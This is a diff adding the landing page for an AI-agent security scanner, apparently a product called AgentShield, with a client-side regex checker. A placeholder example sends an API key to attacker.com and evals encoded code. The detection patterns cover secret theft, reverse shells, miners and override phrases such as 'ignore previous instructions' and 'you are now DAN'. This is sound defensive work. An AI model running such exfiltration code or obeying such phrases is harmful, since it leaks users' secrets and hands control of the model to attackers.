@@ -1,0 +1,1173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AgentShield - The Immune System for AI Agents</title>
+    <meta name="description" content="Scan AI skills and MCP servers for malware, backdoors, and security vulnerabilities. 150+ threat patterns. Free security scanner.">
+    
+    <!-- Open Graph -->
+    <meta property="og:title" content="AgentShield - Security Scanner for AI Agents">
+    <meta property="og:description" content="33% of MCP servers have critical vulnerabilities. Scan yours free.">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://agentshield.dev/og-image.png">
+    
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="AgentShield - AI Security Scanner">
+    <meta name="twitter:description" content="150+ threat patterns. 12 categories. Free scans.">
+    
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        :root {
+            --primary: #00ff88;
+            --primary-dark: #00cc6a;
+            --primary-glow: rgba(0, 255, 136, 0.2);
+            --bg: #0a0a0f;
+            --bg-light: #12121a;
+            --bg-card: #1a1a24;
+            --text: #ffffff;
+            --text-muted: #888;
+            --text-dim: #555;
+            --danger: #ff4444;
+            --danger-bg: rgba(255, 68, 68, 0.1);
+            --warning: #ffaa00;
+            --warning-bg: rgba(255, 170, 0, 0.1);
+            --border: rgba(255, 255, 255, 0.08);
+            --border-hover: rgba(255, 255, 255, 0.15);
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        
+        /* Animated background */
+        .bg-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        /* Header */
+        header {
+            padding: 20px 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: rgba(10, 10, 15, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            z-index: 100;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--text);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo-icon {
+            font-size: 1.6rem;
+        }
+        
+        .logo-text span {
+            color: var(--primary);
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 32px;
+            align-items: center;
+        }
+        
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.95rem;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+        
+        .nav-cta {
+            background: var(--primary) !important;
+            color: var(--bg) !important;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: 600 !important;
+        }
+        
+        .nav-cta:hover {
+            background: var(--primary-dark) !important;
+        }
+        
+        /* Hero */
+        .hero {
+            padding: 160px 0 100px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--primary-glow);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            padding: 8px 16px;
+            border-radius: 100px;
+            font-size: 0.85rem;
+            color: var(--primary);
+            margin-bottom: 24px;
+        }
+        
+        .badge-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--primary);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .hero h1 {
+            font-size: 4rem;
+            font-weight: 800;
+            margin-bottom: 24px;
+            letter-spacing: -0.02em;
+            line-height: 1.1;
+        }
+        
+        .hero h1 .gradient {
+            background: linear-gradient(135deg, var(--primary) 0%, #00ccff 50%, var(--primary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 200% auto;
+            animation: gradient 3s linear infinite;
+        }
+        
+        @keyframes gradient {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
+        
+        .hero .subtitle {
+            font-size: 1.25rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            margin: 0 auto 40px;
+        }
+        
+        .cta-buttons {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.2s;
+            cursor: pointer;
+            border: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            color: var(--bg);
+            box-shadow: 0 0 30px var(--primary-glow);
+        }
+        
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 0 40px var(--primary-glow);
+        }
+        
+        .btn-secondary {
+            background: var(--bg-card);
+            color: var(--text);
+            border: 1px solid var(--border);
+        }
+        
+        .btn-secondary:hover {
+            border-color: var(--primary);
+            background: var(--bg-light);
+        }
+        
+        /* Stats */
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 48px;
+            margin-top: 80px;
+            flex-wrap: wrap;
+        }
+        
+        .stat {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--primary);
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .stat-label {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-top: 4px;
+        }
+        
+        /* Scanner Section */
+        .scanner-section {
+            padding: 100px 0;
+            position: relative;
+        }
+        
+        .scanner-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+        
+        .section-header {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+        
+        .section-header h2 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+        
+        .section-header p {
+            color: var(--text-muted);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .scanner-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 32px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        
+        .scanner-input, .scanner-output {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            overflow: hidden;
+        }
+        
+        .panel-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .panel-title {
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .panel-badge {
+            background: var(--bg-light);
+            padding: 4px 10px;
+            border-radius: 100px;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+        
+        .code-input {
+            width: 100%;
+            min-height: 400px;
+            padding: 20px;
+            background: transparent;
+            border: none;
+            color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            resize: none;
+            outline: none;
+        }
+        
+        .code-input::placeholder {
+            color: var(--text-dim);
+        }
+        
+        .scan-actions {
+            padding: 16px 20px;
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .scan-btn {
+            padding: 12px 28px;
+            font-size: 0.95rem;
+        }
+        
+        .scan-info {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+        
+        /* Results */
+        .results-placeholder {
+            padding: 60px 20px;
+            text-align: center;
+            color: var(--text-muted);
+        }
+        
+        .results-placeholder .icon {
+            font-size: 3rem;
+            margin-bottom: 16px;
+            opacity: 0.5;
+        }
+        
+        .results-content {
+            padding: 20px;
+            display: none;
+        }
+        
+        .results-content.show {
+            display: block;
+        }
+        
+        .result-summary {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        
+        .result-stat {
+            background: var(--bg-light);
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        
+        .result-stat-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .result-stat-label {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+        
+        .result-safe .result-stat-value { color: var(--primary); }
+        .result-warning .result-stat-value { color: var(--warning); }
+        .result-danger .result-stat-value { color: var(--danger); }
+        
+        .findings-list {
+            margin-top: 20px;
+        }
+        
+        .finding-item {
+            background: var(--bg-light);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            border-left: 4px solid var(--danger);
+        }
+        
+        .finding-item.high { border-left-color: var(--warning); }
+        .finding-item.medium { border-left-color: #888; }
+        
+        .finding-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .finding-category {
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        
+        .finding-severity {
+            padding: 4px 10px;
+            border-radius: 100px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+        
+        .severity-critical { background: var(--danger-bg); color: var(--danger); }
+        .severity-high { background: var(--warning-bg); color: var(--warning); }
+        
+        .finding-description {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 8px;
+        }
+        
+        .finding-match {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            background: var(--bg);
+            padding: 8px 12px;
+            border-radius: 8px;
+            color: var(--danger);
+        }
+        
+        /* Features */
+        .features {
+            padding: 100px 0;
+        }
+        
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+        }
+        
+        .feature-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            padding: 32px;
+            border-radius: 16px;
+            transition: all 0.2s;
+        }
+        
+        .feature-card:hover {
+            border-color: var(--border-hover);
+            transform: translateY(-4px);
+        }
+        
+        .feature-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--primary-glow);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+        
+        .feature-card h3 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        
+        .feature-card p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+        }
+        
+        /* Pricing */
+        .pricing {
+            padding: 100px 0;
+            background: var(--bg-light);
+        }
+        
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .pricing-card {
+            background: var(--bg);
+            padding: 40px 32px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            text-align: center;
+            position: relative;
+        }
+        
+        .pricing-card.featured {
+            border-color: var(--primary);
+            box-shadow: 0 0 60px var(--primary-glow);
+        }
+        
+        .pricing-card.featured::before {
+            content: 'MOST POPULAR';
+            position: absolute;
+            top: -14px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--primary);
+            color: var(--bg);
+            padding: 6px 20px;
+            border-radius: 100px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 0.05em;
+        }
+        
+        .pricing-card h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .pricing-card .price {
+            font-size: 3.5rem;
+            font-weight: 800;
+            margin: 24px 0;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        
+        .pricing-card .price span {
+            font-size: 1rem;
+            color: var(--text-muted);
+            font-weight: 400;
+        }
+        
+        .pricing-features {
+            list-style: none;
+            margin: 32px 0;
+            text-align: left;
+        }
+        
+        .pricing-features li {
+            padding: 12px 0;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.95rem;
+        }
+        
+        .pricing-features li::before {
+            content: '✓ ';
+            color: var(--primary);
+            font-weight: 600;
+        }
+        
+        /* CTA Section */
+        .cta-section {
+            padding: 100px 0;
+            text-align: center;
+        }
+        
+        .cta-section h2 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+        
+        .cta-section p {
+            color: var(--text-muted);
+            margin-bottom: 32px;
+        }
+        
+        /* Footer */
+        footer {
+            padding: 40px 0;
+            border-top: 1px solid var(--border);
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+        
+        .footer-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+        
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .scanner-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .feature-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .pricing-grid {
+                grid-template-columns: 1fr;
+                max-width: 400px;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .stats {
+                gap: 24px;
+            }
+            
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .result-summary {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .footer-content {
+                flex-direction: column;
+                gap: 20px;
+            }
+        }
+        
+        /* Loading state */
+        .scanning {
+            position: relative;
+            pointer-events: none;
+        }
+        
+        .scanning::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(10, 10, 15, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid var(--border);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-grid"></div>
+    
+    <header>
+        <div class="container">
+            <nav>
+                <a href="#" class="logo">
+                    <span class="logo-icon">🛡️</span>
+                    <span class="logo-text">Agent<span>Shield</span></span>
+                </a>
+                <div class="nav-links">
+                    <a href="#scanner">Scanner</a>
+                    <a href="#features">Features</a>
+                    <a href="#pricing">Pricing</a>
+                    <a href="https://github.com/agentshield/agentshield" target="_blank">GitHub</a>
+                    <a href="#scanner" class="nav-cta">Try Free</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <div class="badge">
+                <span class="badge-dot"></span>
+                <span>150+ threat patterns • 12 categories</span>
+            </div>
+            
+            <h1>The <span class="gradient">Immune System</span><br>for AI Agents</h1>
+            
+            <p class="subtitle">Scan AI skills and MCP servers for malware, backdoors, and vulnerabilities before they compromise your systems.</p>
+            
+            <div class="cta-buttons">
+                <a href="#scanner" class="btn btn-primary">
+                    🔍 Scan Now — Free
+                </a>
+                <a href="https://github.com/agentshield/agentshield" class="btn btn-secondary" target="_blank">
+                    ⭐ Star on GitHub
+                </a>
+            </div>
+            
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-value">33%</div>
+                    <div class="stat-label">of MCP servers vulnerable</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value">150+</div>
+                    <div class="stat-label">threat patterns</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value">12</div>
+                    <div class="stat-label">security categories</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value">&lt;1s</div>
+                    <div class="stat-label">scan time</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="scanner-section" id="scanner">
+        <div class="container">
+            <div class="section-header">
+                <h2>🔬 Security Scanner</h2>
+                <p>Paste code from any AI skill, MCP server, or plugin to scan for threats.</p>
+            </div>
+            
+            <div class="scanner-container">
+                <div class="scanner-input">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            📝 Input Code
+                        </div>
+                        <div class="panel-badge">JavaScript, Python, TypeScript</div>
+                    </div>
+                    <textarea 
+                        class="code-input" 
+                        id="codeInput" 
+                        placeholder="// Paste code here to scan for security threats...
+
+// Example malicious code:
+const secret = process.env.API_KEY;
+fetch('https://attacker.com/steal?key=' + secret);
+eval(atob('encoded_malware'));"></textarea>
+                    <div class="scan-actions">
+                        <div class="scan-info" id="scanInfo">Ready to scan</div>
+                        <button class="btn btn-primary scan-btn" onclick="performScan()">
+                            🔍 Scan Code
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="scanner-output" id="resultsPanel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            📊 Results
+                        </div>
+                        <div class="panel-badge" id="resultsBadge">Waiting...</div>
+                    </div>
+                    
+                    <div class="results-placeholder" id="resultsPlaceholder">
+                        <div class="icon">🛡️</div>
+                        <p>Paste code and click "Scan Code" to analyze</p>
+                    </div>
+                    
+                    <div class="results-content" id="resultsContent"></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="features" id="features">
+        <div class="container">
+            <div class="section-header">
+                <h2>🛡️ Security Features</h2>
+                <p>Comprehensive protection for the AI agent ecosystem</p>
+            </div>
+            
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🔬</div>
+                    <h3>Skill Scanner</h3>
+                    <p>Detect malware, spyware, crypto-miners, and backdoors in AI skills before installation.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🎯</div>
+                    <h3>Tool Poisoning Detection</h3>
+                    <p>Identify MCP-specific attacks including tool hijacking and hidden instructions.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">💉</div>
+                    <h3>Prompt Injection Defense</h3>
+                    <p>Catch prompt injection attempts that try to manipulate AI behavior.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">👁️</div>
+                    <h3>Agent Guardian</h3>
+                    <p>Real-time monitoring for autonomous agents with rate limiting and kill switch.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">💰</div>
+                    <h3>Wallet Sentinel</h3>
+                    <p>Transaction screening for crypto wallets. Detect drainers before signing.</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>CI/CD Integration</h3>
+                    <p>Scan skills automatically in your pipeline. Block dangerous code before deployment.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="pricing" id="pricing">
+        <div class="container">
+            <div class="section-header">
+                <h2>💎 Simple Pricing</h2>
+                <p>Start free, upgrade when you need more</p>
+            </div>
+            
+            <div class="pricing-grid">
+                <div class="pricing-card">
+                    <h3>Free</h3>
+                    <div class="price">$0<span>/month</span></div>
+                    <ul class="pricing-features">
+                        <li>10 scans per day</li>
+                        <li>Basic threat detection</li>
+                        <li>Web scanner access</li>
+                        <li>Community support</li>
+                    </ul>
+                    <a href="#scanner" class="btn btn-secondary" style="width: 100%;">Start Scanning</a>
+                </div>
+                
+                <div class="pricing-card featured">
+                    <h3>Pro</h3>
+                    <div class="price">$29<span>/month</span></div>
+                    <ul class="pricing-features">
+                        <li>Unlimited scans</li>
+                        <li>API access (1000/day)</li>
+                        <li>Detailed findings</li>
+                        <li>CI/CD integration</li>
+                        <li>Webhook alerts</li>
+                        <li>Priority support</li>
+                    </ul>
+                    <a href="#" class="btn btn-primary" style="width: 100%;">Start Free Trial</a>
+                </div>
+                
+                <div class="pricing-card">
+                    <h3>Enterprise</h3>
+                    <div class="price">$299<span>/month</span></div>
+                    <ul class="pricing-features">
+                        <li>Everything in Pro</li>
+                        <li>Unlimited API calls</li>
+                        <li>Custom threat patterns</li>
+                        <li>Agent monitoring</li>
+                        <li>Dedicated support</li>
+                        <li>SLA guarantee</li>
+                    </ul>
+                    <a href="mailto:enterprise@agentshield.dev" class="btn btn-secondary" style="width: 100%;">Contact Sales</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="cta-section">
+        <div class="container">
+            <h2>Ready to secure your AI agents?</h2>
+            <p>Join thousands of developers protecting their AI systems</p>
+            <a href="#scanner" class="btn btn-primary btn-large">🔍 Start Scanning — Free</a>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div>© 2026 AgentShield. Protecting the AI economy.</div>
+                <div class="footer-links">
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                    <a href="#">Documentation</a>
+                    <a href="https://github.com/agentshield/agentshield">GitHub</a>
+                    <a href="https://twitter.com/agentshield">Twitter</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Enhanced threat patterns (V2)
+        const THREAT_PATTERNS = {
+            data_exfiltration: {
+                severity: 'CRITICAL',
+                description: 'Attempts to steal or transmit sensitive data',
+                patterns: [
+                    /process\.env\.(API_KEY|SECRET|TOKEN|PASSWORD|PRIVATE_KEY|SEED|MNEMONIC)/gi,
+                    /os\.environ|os\.getenv/gi,
+                    /fetch\s*\(\s*['"`]https?:\/\/(?!localhost|127\.0\.0\.1)/gi,
+                    /axios\.(get|post|put|patch|delete)/gi,
+                    /requests\.(get|post)/gi,
+                    /wallet|seed.?phrase|mnemonic|private.?key/gi,
+                    /\.ssh\/|authorized_keys|id_rsa/gi,
+                ]
+            },
+            backdoors: {
+                severity: 'CRITICAL',
+                description: 'Remote code execution and backdoor access',
+                patterns: [
+                    /eval\s*\(/gi,
+                    /new\s+Function\s*\(/gi,
+                    /child_process\.(exec|spawn|fork)/gi,
+                    /subprocess\.(run|call|Popen)/gi,
+                    /os\.system\s*\(/gi,
+                    /socket\.(socket|connect)/gi,
+                    /reverse.?shell|bind.?shell/gi,
+                ]
+            },
+            tool_poisoning: {
+                severity: 'CRITICAL',
+                description: 'MCP tool poisoning attacks',
+                patterns: [
+                    /tool\.name\s*=.*\b(exec|sudo|rm|delete|shell)\b/gi,
+                    /\u200B|\u200C|\u200D|\uFEFF/g,
+                    /ignore\s+(previous|all)\s+instructions/gi,
+                    /\[SYSTEM\]|\[ADMIN\]|\[OVERRIDE\]/gi,
+                ]
+            },
+            prompt_injection: {
+                severity: 'HIGH',
+                description: 'Attempts to manipulate AI model behavior',
+                patterns: [
+                    /ignore\s+(previous|all|prior)\s+(instructions|prompts|rules)/gi,
+                    /disregard\s+(your|the)\s+(rules|instructions)/gi,
+                    /you\s+are\s+now\s+(DAN|evil|unrestricted)/gi,
+                    /pretend\s+(there\s+are|you\s+have)\s+no\s+(rules|limits)/gi,
+                ]
+            },
+            crypto_mining: {
+                severity: 'HIGH',
+                description: 'Unauthorized cryptocurrency mining',
+                patterns: [
+                    /coinhive|cryptonight|mineralt/gi,
+                    /xmrig|cpuminer|minerd/gi,
+                    /stratum\+tcp:\/\//gi,
+                ]
+            },
+            obfuscation: {
+                severity: 'MEDIUM',
+                description: 'Code obfuscation techniques',
+                patterns: [
+                    /\\x[0-9a-f]{2}\\x[0-9a-f]{2}/gi,
+                    /String\.fromCharCode\s*\(\s*\d+\s*,/gi,
+                    /_0x[a-f0-9]{4,}/gi,
+                    /[a-zA-Z0-9+\/]{100,}={0,2}/g,
+                ]
+            }
+        };
+
+        const SEVERITY_WEIGHTS = { CRITICAL: 100, HIGH: 50, MEDIUM: 20 };
+
+        function performScan() {
+            const code = document.getElementById('codeInput').value;
+            const resultsContent = document.getElementById('resultsContent');
+            const resultsPlaceholder = document.getElementById('resultsPlaceholder');
+            const resultsBadge = document.getElementById('resultsBadge');
+            const scanInfo = document.getElementById('scanInfo');
+            
+            if (!code.trim()) {
+                scanInfo.textContent = '⚠️ Please paste some code';
+                return;
+            }
+
+            scanInfo.textContent = '🔍 Scanning...';
+            
+            // Scan code
+            const findings = [];
+            let totalScore = 0;
+
+            for (const [category, config] of Object.entries(THREAT_PATTERNS)) {
+                for (const pattern of config.patterns) {
+                    const matches = code.match(pattern);
+                    if (matches) {
+                        findings.push({
+                            category: category.replace(/_/g, ' '),
+                            severity: config.severity,
+                            description: config.description,
+                            matches: [...new Set(matches)].slice(0, 3),
+                            matchCount: matches.length
+                        });
+                        totalScore += SEVERITY_WEIGHTS[config.severity] || 0;
+                    }
+                }
+            }
+
+            // Determine rating
+            const rating = totalScore === 0 ? 'SAFE' :
+                          totalScore < 50 ? 'LOW_RISK' :
+                          totalScore < 100 ? 'MEDIUM_RISK' :
+                          totalScore < 200 ? 'HIGH_RISK' : 'CRITICAL_RISK';
+
+            const ratingEmoji = {
+                SAFE: '✅',
+                LOW_RISK: '🟡',
+                MEDIUM_RISK: '🟠',
+                HIGH_RISK: '🔴',
+                CRITICAL_RISK: '⛔'
+            };
+
+            // Update UI
+            resultsPlaceholder.style.display = 'none';
+            resultsContent.classList.add('show');
+            resultsBadge.textContent = `${ratingEmoji[rating]} ${rating.replace('_', ' ')}`;
+            scanInfo.textContent = `✅ Scanned ${code.length.toLocaleString()} chars`;
+
+            // Count by severity
+            const criticalCount = findings.filter(f => f.severity === 'CRITICAL').length;
+            const highCount = findings.filter(f => f.severity === 'HIGH').length;
+            const mediumCount = findings.filter(f => f.severity === 'MEDIUM').length;
+
+            let html = `
+                <div class="result-summary">
+                    <div class="result-stat ${rating === 'SAFE' ? 'result-safe' : 'result-danger'}">
+                        <div class="result-stat-value">${totalScore}</div>
+                        <div class="result-stat-label">Risk Score</div>
+                    </div>
+                    <div class="result-stat ${criticalCount > 0 ? 'result-danger' : 'result-safe'}">
+                        <div class="result-stat-value">${criticalCount}</div>
+                        <div class="result-stat-label">Critical</div>
+                    </div>
+                    <div class="result-stat ${highCount > 0 ? 'result-warning' : 'result-safe'}">
+                        <div class="result-stat-value">${highCount}</div>
+                        <div class="result-stat-label">High</div>
+                    </div>
+                    <div class="result-stat">
+                        <div class="result-stat-value">${mediumCount}</div>
+                        <div class="result-stat-label">Medium</div>
+                    </div>
+                </div>
+            `;
+
+            if (findings.length === 0) {
+                html += `
+                    <div style="text-align: center; padding: 40px 20px;">
+                        <div style="font-size: 3rem; margin-bottom: 16px;">✅</div>
+                        <h3 style="color: var(--primary); margin-bottom: 8px;">No Threats Detected</h3>
+                        <p style="color: var(--text-muted);">This code appears safe. Always review manually before running.</p>
+                    </div>
+                `;
+            } else {
+                html += `
+                    <div style="background: var(--danger-bg); padding: 12px 16px; border-radius: 8px; margin-bottom: 16px;">
+                        <strong style="color: var(--danger);">${ratingEmoji[rating]} ${rating === 'CRITICAL_RISK' ? 'DO NOT INSTALL' : 'Review Required'}</strong>
+                        <span style="color: var(--text-muted);"> — ${findings.length} threat(s) detected</span>
+                    </div>
+                    <div class="findings-list">
+                `;
+
+                for (const f of findings.slice(0, 5)) {
+                    const severityClass = f.severity.toLowerCase();
+                    html += `
+                        <div class="finding-item ${severityClass}">
+                            <div class="finding-header">
+                                <span class="finding-category">${f.category}</span>
+                                <span class="finding-severity severity-${severityClass}">${f.severity}</span>
+                            </div>
+                            <div class="finding-description">${f.description}</div>
+                            <div class="finding-match">${f.matches[0].substring(0, 60)}${f.matches[0].length > 60 ? '...' : ''}</div>
+                        </div>
+                    `;
+                }
+
+                if (findings.length > 5) {
+                    html += `<p style="color: var(--text-muted); text-align: center; margin-top: 16px;">+ ${findings.length - 5} more findings. <a href="#pricing" style="color: var(--primary);">Upgrade for full report</a></p>`;
+                }
+
+                html += '</div>';
+            }
+
+            resultsContent.innerHTML = html;
+        }
+
+        // Allow Enter to scan in textarea (Cmd/Ctrl + Enter)
+        document.getElementById('codeInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && (e.metaKey || e.ctrlKey)) {
+                performScan();
+            }
+        });
+    </script>
+</body>
+</html>
